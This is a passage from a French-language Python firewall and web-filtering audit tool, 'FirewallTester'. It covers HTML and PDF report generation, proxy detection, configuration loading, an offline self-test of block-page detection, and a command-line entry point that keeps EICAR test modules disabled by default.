        col = sev_color.get(f["severity"], "var(--muted)")
        ratio = (f'<span class="chip ghost">{E(f["ratio"])} en défaut</span>'
                 if f.get("ratio") else "")
        proof = ""
        if f.get("tests"):
            items = "".join(f"<code>{E(n)}</code>" for n in f["tests"][:14])
            more = f" +{len(f['tests']) - 14} autre(s)" if len(f["tests"]) > 14 else ""
            proof = f'<div class="proof"><b>Tests concernés :</b><br>{items}{more}</div>'
        action = (f'<div class="action"><b>Action recommandée —</b> {E(f["action"])}</div>'
                  if f.get("action") else "")
        out.append(
            f'<div class="finding" style="--c:{col}">'
            f'<div class="head">'
            f'<span class="chip {f["severity"]}"><i class="dot"></i>{SEV_LABEL.get(f["severity"], f["severity"])}</span>'
            f'<span class="title">{i}. {E(f["title"])}</span>{ratio}</div>'
            f'<div class="detail">{E(f["detail"])}</div>{action}{proof}</div>')
    return "".join(out)

def generate_html_report(results, score, findings, policy_rows, config, output_path):
    meta    = results["meta"]
    b       = results.get("baseline", {})
    g       = score["_global"]
    gl, gtxt = grade(g["pct"])
    gcol    = pct_color(g["pct"])
    client  = config.get("client", {})
    auditor = config.get("auditor", {})
    audit   = config.get("audit", {})
    ts      = meta["timestamp"].replace("T", " ")

    logo = (f'<img src="{E(client["logo_url"])}" alt="" style="max-height:44px;margin-bottom:14px">'
            if client.get("logo_url") else "")

    n_crit = sum(1 for f in findings if f["severity"] == "critical")
    n_maj  = sum(1 for f in findings if f["severity"] == "major")

    kpis = [
        ("Note globale", f"{g['pct']}%", f"{g['passed']}/{g['scored']} tests conformes", gcol),
        ("Défauts", str(g["failed"]), f"{n_crit} critique(s), {n_maj} majeur(s)", "#b91c1c"),
        ("Non concluants", str(g["warn"]), "exclus du calcul de la note", "#b45309"),
        ("Discrétionnaires", str(g["policy_total"]),
         (f"{g['policy_pct']}% bloqués" if g["policy_pct"] is not None else "—"), "#6d28d9"),
        ("Tests exécutés", str(g["total"]), f"{len(meta['modules'])} module(s)", "#1d4ed8"),
    ]
    kpi_html = "".join(
        f'<div class="kpi" style="--c:{col}"><div class="v">{E(v)}</div>'
        f'<div class="l">{E(lbl)}</div><div class="d">{E(d)}</div></div>'
        for lbl, v, d, col in kpis)

    notes_html = "".join(f'<div class="note">{E(n)}</div>' for n in b.get("notes", []))

    policy_html = ""
    if policy_rows:
        cells = []
        for row in policy_rows:
            cells.append(
                f'<span class="name">{E(row["label"])}</span>'
                f'<span class="track"><span class="fill" style="width:{row["pct"]}%;--c:{row["color"]}"></span></span>'
                f'<span class="val" style="--c:{row["color"]}">{row["pct"]}%'
                f'<small> · {row["blocked"]}/{row["total"]}</small></span>')
        policy_html = (
            '<h2 class="sec">Catégories discrétionnaires <span class="n">hors note</span></h2>'
            '<div class="card"><p style="color:var(--ink2);font-size:13px;margin-bottom:14px">'
            + E(POLICY_NOTE) + '</p>'
            f'<div class="bars">{"".join(cells)}</div></div>')

    # ── Sections détaillées ───────────────────────────────────────────────────
    sections = []
    if results["modules"].get("url"):
        sections.append('<h2 class="sec">Filtrage URL par catégorie</h2>'
                        + build_category_accordion(results["modules"]["url"]))
    for mod in ALL_MODULES:
        if mod == "url" or mod not in results["modules"]:
            continue
        s = score.get(mod, {})
        badge = ""
        if s.get("pct") is not None:
            badge = f'<span class="n">{s["pct"]}%</span>'
        sections.append(f'<h2 class="sec">{E(MODULE_LABELS[mod])} {badge}</h2>'
                        + build_table(results["modules"][mod]))

    inconclusive = [t for tests in results["modules"].values() for t in tests if t["verdict"] == "warn"]
    annex_warn = ""
    if inconclusive:
        rows = "".join(
            f'<tr><td class="nm">{E(t["name"])}</td><td class="tg"><span class="mono">{E(t["target"][:90])}</span></td>'
            f'<td>{E(t["details"])}</td><td class="ev">{E(t["evidence"])}</td></tr>'
            for t in inconclusive)
        annex_warn = (
            '<h2 class="sec">Annexe A — Tests non concluants '
            f'<span class="n">{len(inconclusive)}</span></h2>'
            '<div class="card" style="margin-bottom:10px;color:var(--ink2);font-size:13px">'
            'Ces tests n’ont pas produit de preuve exploitable (ressource de test indisponible, '
            'hôte de référence injoignable, limitation du poste de test). Ils sont exclus du calcul '
            'de la note afin de ne pas produire de conclusion erronée.</div>'
            '<div class="tablewrap"><div class="scroll"><table><thead><tr><th>Test</th><th>Cible</th>'
            f'<th>Constat</th><th>Cause</th></tr></thead><tbody>{rows}</tbody></table></div></div>')

    method = f"""
<h2 class="sec">Annexe B — Méthode et limites</h2>
<div class="card">
  <div class="meta-grid">
    <div><span>Outil</span><b>FirewallTester v{E(VERSION)}</b></div>
    <div><span>Poste de test</span><b>{E(meta['hostname'])}</b></div>
    <div><span>Système</span><b>{E(meta['os'])} — Python {E(meta['python'])}</b></div>
    <div><span>Proxy</span><b>{E(str(meta['proxy']))}</b></div>
    <div><span>Résolveurs DNS</span><b>{E(', '.join(b.get('dns_servers', [])) or '—')}</b></div>
    <div><span>Inspection TLS</span><b>{'oui — ' + E(str(b.get('tls_issuer'))) if b.get('tls_inspection') else ('non' if b.get('tls_inspection') is False else 'indéterminée')}</b></div>
    <div><span>Sortie HTTP directe</span><b>{'possible' if b.get('http_plain') else 'interceptée ou bloquée'}</b></div>
    <div><span>Point d'écho</span><b>{E(b.get('echo') or '—')}</b></div>
  </div>
  <div class="legend" style="margin-top:16px">
    <span><b>Conforme</b> : le comportement observé correspond à l'attendu.</span>
    <span><b>Défaut</b> : écart avéré par rapport à l'attendu.</span>
    <span><b>Non concluant</b> : preuve insuffisante, test exclu de la note.</span>
    <span><b>Discrétionnaire</b> : relève de la politique interne, hors note.</span>
  </div>
  <div class="legend">
    <span><b>certain</b> : preuve directe (signature d'équipement, RST, sinkhole, bannière).</span>
    <span><b>probable</b> : faisceau d'indices concordants.</span>
    <span><b>faible</b> : signal ambigu, à confirmer manuellement.</span>
  </div>
  <p style="margin-top:16px;color:var(--ink2);font-size:13px">
    Les tests sont réalisés depuis un poste unique, à un instant donné, avec les droits de
    l'utilisateur courant. Un résultat « non bloqué » signifie que le flux a atteint sa destination
    au moment du test ; il n'exclut pas une journalisation ou une alerte côté équipement. Aucun
    code malveillant n'est exécuté : seules des ressources publiées à des fins de test
    (EICAR, AMTSO, Google Safe Browsing, WiCAR, domaines de test Cisco Umbrella) sont sollicitées.
  </p>
</div>"""

    doc = f"""<!DOCTYPE html>
<html lang="fr" data-theme="light">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Audit pare-feu — {E(client.get('name', 'Rapport'))} — {E(ts[:10])}</title>
<style>{REPORT_CSS}</style>
</head>
<body>

<div class="topbar no-print">
  <span class="brand">Firewall<span>Tester</span></span>
  <span class="chip ghost">v{E(VERSION)}</span>
  <span class="spacer"></span>
  <input id="searchBox" class="search" type="search" placeholder="Rechercher un test…">
  <button class="btn on" data-filter="all">Tous</button>
  <button class="btn" data-filter="fail">Défauts</button>
  <button class="btn" data-filter="warn">Non concluants</button>
  <button class="btn" data-filter="pass">Conformes</button>
  <button class="btn" id="themeBtn">Thème</button>
  <button class="btn" id="printBtn">Imprimer / PDF</button>
</div>

<div class="wrap">

  <div class="cover" style="--g:{gcol}">
    <div>
      {logo}
      <span class="confid">{E(audit.get('confidentiality', 'CONFIDENTIEL'))}</span>
      <h1>{E(audit.get('title', 'Audit de pare-feu et de politique web'))}</h1>
      <div class="sub">Évaluation du filtrage réseau depuis un poste utilisateur</div>
      <dl>
        <dt>Client</dt><dd>{E(client.get('name', '—'))}</dd>
        <dt>Périmètre</dt><dd>{E(audit.get('scope') or (meta['hostname'] + ' — proxy : ' + str(meta['proxy'])))}</dd>
        <dt>Auditeur</dt><dd>{E(auditor.get('name', '—'))}{(' — ' + E(auditor.get('company'))) if auditor.get('company') else ''}</dd>
        <dt>Date</dt><dd>{E(ts)}</dd>
        <dt>Modules</dt><dd>{E(', '.join(MODULE_LABELS.get(m, m) for m in meta['modules']))}</dd>
      </dl>
    </div>
    <div class="grade">
      <div class="letter">{gl}</div>
      <div class="pct">{g['pct']}%</div>
      <div class="cap">{E(gtxt)}</div>
    </div>
  </div>

  <h2 class="sec">Synthèse</h2>
  {notes_html}
  <div class="kpis">{kpi_html}</div>
  <div class="card">{build_bars(score)}</div>

  <h2 class="sec">Constats et recommandations <span class="n">{len(findings)}</span></h2>
  {build_findings_html(findings)}

  {policy_html}

  {"".join(sections)}

  {annex_warn}
  {method}

  <div class="foot">
    <span>FirewallTester v{E(VERSION)} — {E(auditor.get('company', '—'))} — {E(auditor.get('name', '—'))}</span>
    <span>{E(audit.get('confidentiality', 'CONFIDENTIEL'))} — {E(ts[:10])}</span>
    <span>Usage réservé aux réseaux autorisés</span>
  </div>
</div>

<script>{REPORT_JS}</script>
</body>
</html>"""

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(doc)
    return output_path

# ═══════════════════════════════════════════════════════════════════════════════
# EXPORT PDF
# ═══════════════════════════════════════════════════════════════════════════════

def _find_chromium():
    """Chemin d'un navigateur Chromium utilisable en mode impression."""
    import shutil
    names = ["chrome", "google-chrome", "google-chrome-stable", "chromium",
             "chromium-browser", "msedge", "microsoft-edge"]
    for n in names:
        p = shutil.which(n)
        if p:
            return p
    candidates = []
    if platform.system() == "Windows":
        for env in ("PROGRAMFILES", "PROGRAMFILES(X86)", "LOCALAPPDATA"):
            base = os.environ.get(env)
            if not base:
                continue
            candidates += [
                os.path.join(base, "Google", "Chrome", "Application", "chrome.exe"),
                os.path.join(base, "Microsoft", "Edge", "Application", "msedge.exe"),
                os.path.join(base, "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
            ]
    elif platform.system() == "Darwin":
        candidates += ["/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
                       "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge"]
    for c in candidates:
        if os.path.isfile(c):
            return c
    return None

def export_pdf(html_path, pdf_path, quiet=False):
    """WeasyPrint → Chromium headless → pdfkit. Retourne True si un PDF est produit."""
    def say(msg, col=C.GREY):
        if not quiet:
            print(f"  {col}{msg}{C.RESET}")

    html_abs = os.path.abspath(html_path)
    pdf_abs  = os.path.abspath(pdf_path)

    try:
        from weasyprint import HTML as WeasyHTML
        say("Export PDF via WeasyPrint…")
        WeasyHTML(filename=html_abs).write_pdf(pdf_abs)
        return True
    except ImportError:
        pass
    except Exception as e:
        say(f"WeasyPrint indisponible : {str(e)[:90]}", C.AMBER)

    browser = _find_chromium()
    if browser:
        say(f"Export PDF via {os.path.basename(browser)}…")
        url = "file:///" + html_abs.replace("\\", "/").lstrip("/")
        cmd = [browser, "--headless=new", "--disable-gpu", "--no-first-run",
               "--no-default-browser-check", "--disable-extensions",
               "--virtual-time-budget=4000", "--run-all-compositor-stages-before-draw",
               "--no-pdf-header-footer", f"--print-to-pdf={pdf_abs}", url]
        try:
            proc = subprocess.run(cmd, capture_output=True, timeout=120)
            if os.path.exists(pdf_abs) and os.path.getsize(pdf_abs) > 1024:
                return True
            cmd[1] = "--headless"                       # anciennes versions
            subprocess.run(cmd, capture_output=True, timeout=120)
            if os.path.exists(pdf_abs) and os.path.getsize(pdf_abs) > 1024:
                return True
            say(f"Chromium n'a pas produit de PDF : {proc.stderr.decode('utf-8', 'ignore')[:120]}", C.AMBER)
        except Exception as e:
            say(f"Chromium : {str(e)[:90]}", C.AMBER)

    try:
        import pdfkit
        say("Export PDF via wkhtmltopdf…")
        pdfkit.from_file(html_abs, pdf_abs, options={
            "enable-local-file-access": "", "quiet": "", "page-size": "A4",
            "margin-top": "12mm", "margin-bottom": "12mm",
            "margin-left": "10mm", "margin-right": "10mm",
            "encoding": "UTF-8", "print-media-type": "",
        })
        return True
    except ImportError:
        pass
    except Exception as e:
        say(f"wkhtmltopdf : {str(e)[:90]}", C.AMBER)

    if not quiet:
        print(f"  {C.AMBER}Aucun moteur PDF disponible.{C.RESET}")
        print(f"  {C.GREY}Options : installer Chrome/Edge (détection automatique),")
        print(f"            ou  pip install weasyprint,")
        print(f"            ou  ouvrir le rapport HTML et utiliser « Imprimer / PDF ».{C.RESET}")
    return False

# ═══════════════════════════════════════════════════════════════════════════════
# PROXY / CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

def detect_system_proxy():
    for var in ("HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy"):
        v = os.environ.get(var, "").strip()
        if v:
            return v
    if platform.system() == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Internet Settings")
            enabled, _ = winreg.QueryValueEx(key, "ProxyEnable")
            if enabled:
                server, _ = winreg.QueryValueEx(key, "ProxyServer")
                if server:
                    if ";" in server:                  # http=host:port;https=host:port
                        parts = dict(p.split("=", 1) for p in server.split(";") if "=" in p)
                        server = parts.get("https") or parts.get("http") or ""
                    if server and not server.startswith("http"):
                        server = "http://" + server
                    return server or None
        except Exception:
            pass
    return None

def build_proxies(cfg_proxy):
    if not cfg_proxy.get("enabled"):
        sysp = detect_system_proxy()
        return {"http": sysp, "https": sysp} if sysp else {}
    url = (cfg_proxy.get("url") or "").strip()
    if not url:
        return {}
    user = (cfg_proxy.get("username") or "").strip()
    pw   = (cfg_proxy.get("password") or "").strip()
    if user:
        p = urlparse(url)
        url = urlunparse(p._replace(netloc=f"{user}:{pw}@{p.netloc}"))
    return {"http": url, "https": url}

DEFAULT_CONFIG = {
    "client":  {"name": "", "logo_url": "", "contact": ""},
    "auditor": {"name": "", "company": "", "email": ""},
    "audit":   {"title": "Audit de pare-feu et de politique web",
                "confidentiality": "CONFIDENTIEL", "scope": "", "version": "1.0"},
    "proxy":   {"enabled": False, "url": "", "username": "", "password": ""},
    "policy":  {},
}

def load_config(path="config.json"):
    cfg = json.loads(json.dumps(DEFAULT_CONFIG))
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                user = json.load(f)
            for k, v in user.items():
                if isinstance(v, dict) and isinstance(cfg.get(k), dict):
                    cfg[k].update(v)
                else:
                    cfg[k] = v
        except Exception as e:
            print(f"{C.AMBER}[!] config.json illisible ({e}) — valeurs par défaut utilisées.{C.RESET}")
    return cfg

# ═══════════════════════════════════════════════════════════════════════════════
# POINT D'ENTRÉE
# ═══════════════════════════════════════════════════════════════════════════════

def self_test():
    """
    Vérifie hors ligne le moteur de détection : une page de blocage doit être
    reconnue, et un article de sécurité citant un éditeur ne doit PAS l'être.
    """
    class FakeResp:
        def __init__(self, code, url, headers=None):
            self.status_code, self.url = code, url
            self.headers = headers or {}

    big = "contenu editorial " * 3000
    cases = [
        ("Page Zscaler (HTTP 200)", FakeResp(200, "http://site/"),
         "<html>Access Denied. This website is blocked by your network administrator. Zscaler</html>",
         OBS_BLOCKED),
        ("Page FortiGuard (403)", FakeResp(403, "http://site/"),
         "<html>FortiGuard Web Filtering : la page demandee a ete bloquee.</html>", OBS_BLOCKED),
        ("En-tete Squid", FakeResp(403, "http://site/", {"X-Squid-Error": "ERR_ACCESS_DENIED"}),
         "ERROR: The requested URL could not be retrieved", OBS_BLOCKED),
        ("Page de garde FR", FakeResp(200, "http://site/"),
         "<html>Acces refuse : votre administrateur a bloque cette categorie.</html>", OBS_BLOCKED),
        ("403 nu, sans signature", FakeResp(403, "http://site/"), "Forbidden", OBS_INCONCLUSIVE),
        ("403 depuis un CDN", FakeResp(403, "http://site/", {"cf-ray": "1", "server": "cloudflare"}),
         "error 1010", OBS_ALLOWED),
        ("Article d'editeur citant Zscaler et Fortinet", FakeResp(200, "https://vendor/blog"),
         "Zscaler and Fortinet blocked access to " + big, OBS_ALLOWED),
        ("Site reel volumineux", FakeResp(200, "https://site/"), "<html>" + big + "</html>", OBS_ALLOWED),
        ("Page 404", FakeResp(404, "https://site/x"), "Not found", OBS_ALLOWED),
    ]
    ok = True
    print(f"\n  {C.B}Auto-test du moteur de détection{C.RESET}\n")
    for label, resp, body, expected in cases:
        obs, conf, det, ev, vendor = classify_http(resp, body, "site")
        good = obs == expected
        ok &= good
        mark = f"{C.GREEN}OK {C.RESET}" if good else f"{C.RED}ECH{C.RESET}"
        print(f"   [{mark}] {vpad(label, 44)} {C.GREY}attendu {expected:12s} obtenu {obs}{C.RESET}")

    checks = [
        ("IP privée reconnue",           is_private_ip("192.168.1.1") is True),
        ("IP publique non privée",       is_private_ip("8.8.8.8") is False),
        ("Puits Umbrella reconnu",       is_sinkholed("146.112.61.106") is True),
        ("Domaine enregistrable",        registrable("cdn.discordapp.com") == "discordapp.com"),
        ("Autorité publique reconnue",   looks_public_ca("DigiCert Inc") is True),
        ("Autorité interne détectée",    looks_public_ca("ACME Corp Proxy CA") is False),
        ("Encodage DNS",                 _dns_encode_name("a.example.com") == b"\x01a\x07example\x03com\x00"),
        # Le détecteur EICAR ne se déclenche pas sur du contenu anodin (et le
        # fichier ne contient aucune charge de référence à vérifier).
        ("Détecteur EICAR neutre au repos", contains_eicar(b"contenu parfaitement anodin " * 8) is False),
    ]
    print()
    for label, cond in checks:
        ok &= bool(cond)
        mark = f"{C.GREEN}OK {C.RESET}" if cond else f"{C.RED}ECH{C.RESET}"
        print(f"   [{mark}] {label}")
    print(f"\n  {(C.GREEN + 'Auto-test réussi') if ok else (C.RED + 'Auto-test en échec')}{C.RESET}\n")
    return 0 if ok else 1

def main():
    parser = argparse.ArgumentParser(
        prog="firewall_tester.py",
        description=f"FirewallTester v{VERSION} — audit de pare-feu, proxy et politique web",
        formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("--modules", nargs="+", choices=ALL_MODULES, metavar="MOD",
                        help="modules à exécuter : " + ", ".join(ALL_MODULES))
    parser.add_argument("--no-tui", action="store_true", help="lancer sans le menu interactif")
    parser.add_argument("--output", default=None, help="chemin du rapport HTML")
    parser.add_argument("--no-html", action="store_true", help="ne pas générer le rapport HTML")
    parser.add_argument("--pdf", action="store_true", help="générer aussi un PDF")
    parser.add_argument("--json", action="store_true", help="exporter aussi les données JSON")
    parser.add_argument("--verbose", action="store_true", help="afficher chaque test")
    parser.add_argument("--quiet", action="store_true", help="sortie minimale")
    parser.add_argument("--proxy", default=None, help="http://[utilisateur:motdepasse@]hote:port")
    parser.add_argument("--no-proxy", action="store_true", help="ignorer le proxy système")
    parser.add_argument("--config", default="config.json", help="fichier de configuration")
    parser.add_argument("--timeout", type=int, default=None, help="délai réseau en secondes (défaut 6)")
    parser.add_argument("--allow-eicar", action="store_true",
                        help="autoriser les modules eicar/upload à matérialiser la charge EICAR\n"
                             "(par défaut ils sont gelés ; à n'activer que si le dossier est exclu\n"
                             "de l'antivirus, sinon le script sera supprimé)")
    parser.add_argument("--list-tests", action="store_true", help="lister les tests et quitter")
    parser.add_argument("--self-test", action="store_true",
                        help="vérifier le moteur de détection hors ligne et quitter")
    args = parser.parse_args()

    if args.self_test:
        sys.exit(self_test())

    if args.timeout:
        globals()["CONNECT_TO"] = args.timeout
        globals()["TCP_TO"] = args.timeout
        globals()["READ_TO"] = args.timeout + 4

    if args.list_tests:
        for mod in ALL_MODULES:
            print(f"\n{C.CYAN}{C.B}{MODULE_LABELS[mod]}{C.RESET} {C.GREY}({mod}, {MODULE_SIZES[mod]} tests){C.RESET}")
        print(f"\n  Total : {sum(MODULE_SIZES.values())} tests\n")
        return

    config = load_config(args.config)
    policy = config.get("policy", {})

    if args.proxy:
        PROXIES.update({"http": args.proxy, "https": args.proxy})
        config["proxy"].update({"enabled": True, "url": args.proxy})
    elif not args.no_proxy:
        PROXIES.update(build_proxies(config.get("proxy", {})))

    stamp    = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    modules  = args.modules or ALL_MODULES
    out_html = args.output or f"rapport_pare-feu_{stamp}.html"
    exp_json, exp_pdf, verbose = args.json, args.pdf, args.verbose
    allow_eicar = args.allow_eicar

    interactive = (not args.no_tui) and sys.stdin.isatty() and not args.quiet
    if interactive:
        modules, out_html, exp_json, exp_pdf, verbose, allow_eicar, config = tui_menu(config, args.modules)
        policy = config.get("policy", {})

    if not args.quiet:
        clear()
        _top(f"FirewallTester v{VERSION}")
        _b()
        _b(f" {C.GREY}{vpad('Poste', 12)}{C.RESET}{socket.gethostname()}  ({platform.system()} {platform.release()})")
        _b(f" {C.GREY}{vpad('Client', 12)}{C.RESET}{config.get('client', {}).get('name') or '—'}")
        _b(f" {C.GREY}{vpad('Proxy', 12)}{C.RESET}{list(PROXIES.values())[0] if PROXIES else 'accès direct'}")
        _b(f" {C.GREY}{vpad('Modules', 12)}{C.RESET}{', '.join(modules)}")
        _b(f" {C.GREY}{vpad('Tests', 12)}{C.RESET}{count_tests(modules)}")
        _b()
        _bottom()
        print(f"\n  {C.CYAN}Mesures de contrôle…{C.RESET}", end="", flush=True)

    run_baseline()

    if not args.quiet:
        print("\r" + " " * 40 + "\r", end="")
        b = BASELINE
        state = [
            (b["internet"], "connectivité"),
            (b["https_ok"], "HTTPS"),
            (b["portquiz"], "hôte de test ports"),
            (bool(b["echo"]), "point d'écho"),
        ]
        line = "   ".join(f"{C.GREEN if ok else C.RED}●{C.RESET} {C.GREY}{lbl}{C.RESET}" for ok, lbl in state)
        tls = ("interception TLS active" if b["tls_inspection"]
               else ("pas d'interception TLS" if b["tls_inspection"] is False else "TLS indéterminé"))
        print(f"  {line}   {C.GREY}·{C.RESET} {C.WHITE}{tls}{C.RESET}")
        for n in b["notes"]:
            print(f"  {C.AMBER}!{C.RESET} {C.GREY}{n}{C.RESET}")
        print()

    if not BASELINE["internet"]:
        print(f"  {C.RED}Aucune connectivité détectée : les verdicts seraient tous faussés.{C.RESET}")
        print(f"  {C.GREY}Vérifiez la configuration proxy (--proxy) puis relancez.{C.RESET}\n")

    if not args.quiet and any(m in ("eicar", "upload") for m in modules):
        if allow_eicar:
            print(f"  {C.AMBER}⚠ Modules EICAR/upload autorisés : la charge de test sera "
                  f"matérialisée. Si le dossier n'est pas exclu de l'antivirus, le script "
                  f"peut être supprimé.{C.RESET}\n")
        else:
            print(f"  {C.GREY}Modules eicar/upload gelés (charges non matérialisées) — "
                  f"utilisez --allow-eicar pour les exécuter.{C.RESET}\n")

    t_start = time.time()
    results = run_all_tests(modules=modules, verbose=verbose, policy=policy,
                            quiet=args.quiet, allow_eicar=allow_eicar)
    duration = round(time.time() - t_start)
    results["meta"]["duration_s"] = duration

    score       = compute_score(results)
    findings    = build_findings(results, score, policy)
    policy_rows = policy_summary(results, score)

    if not args.quiet:
        print_console_summary(results, score, findings, policy_rows)
        print(f"\n  {C.GREY}Durée : {duration // 60} min {duration % 60} s{C.RESET}")

    if not args.no_html:
        generate_html_report(results, score, findings, policy_rows, config, out_html)
        print(f"  {C.GREEN}Rapport HTML{C.RESET} : {os.path.abspath(out_html)}")
        if exp_pdf:
            pdf_path = re.sub(r"\.html?$", "", out_html) + ".pdf"
            if export_pdf(out_html, pdf_path, quiet=args.quiet):
                print(f"  {C.GREEN}Rapport PDF {C.RESET} : {os.path.abspath(pdf_path)}")

    if exp_json:
        out_json = re.sub(r"\.html?$", "", out_html) + ".json"
        with open(out_json, "w", encoding="utf-8") as f:
            json.dump({"results": results, "score": score, "findings": findings,
                       "policy": policy_rows}, f, indent=2, ensure_ascii=False)
        print(f"  {C.GREEN}Données JSON{C.RESET} : {os.path.abspath(out_json)}")

    print(f"\n  {C.GREY}Usage réservé aux réseaux dont vous êtes propriétaire ou pour lesquels")
    print(f"  vous disposez d'une autorisation écrite.{C.RESET}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {C.AMBER}Audit interrompu par l'utilisateur.{C.RESET}\n")
        sys.exit(130)






